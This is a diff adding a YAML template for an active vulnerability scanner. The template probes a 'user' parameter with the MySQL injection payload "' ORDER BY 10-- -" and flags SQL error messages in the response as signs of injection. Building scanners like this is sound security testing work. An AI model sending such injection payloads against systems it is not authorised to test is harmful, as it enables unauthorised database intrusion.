@@ -1,0 +1,23 @@
+id: patt-sqli-mysql-order-01-user
+name: 'PATT sqli patt-sqli-mysql-order-01 via user'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - php
+description: 'PATT MySQL ORDER BY enumerasi kolom (Unknown column = sinyal). [patt:patt-sqli-mysql-order-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      user:
+        - ''' ORDER BY 10-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'Unknown column'
+          - 'SQL syntax'
+          - 'mysql_fetch'
